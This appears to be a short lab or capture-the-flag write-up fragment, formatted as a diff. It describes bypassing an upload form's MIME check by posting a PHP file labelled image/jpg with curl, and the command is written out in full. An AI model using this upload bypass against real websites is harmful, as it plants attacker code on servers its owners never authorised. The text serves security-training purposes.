@@ -1,0 +1,5 @@
+.jpg files and MIME image/jpeg can be passed to upload form. therefore i tried to put file with php code to the server, but there was no way how to reach this file. I tried another way and created file hi.php, uploaded it with specified MIME by this command
+
+```
+curl -X POST -F "Upload=Upload" -F "uploaded=@hi.php;type=image/jpg" "http://192.168.64.3/?page=upload"
+```
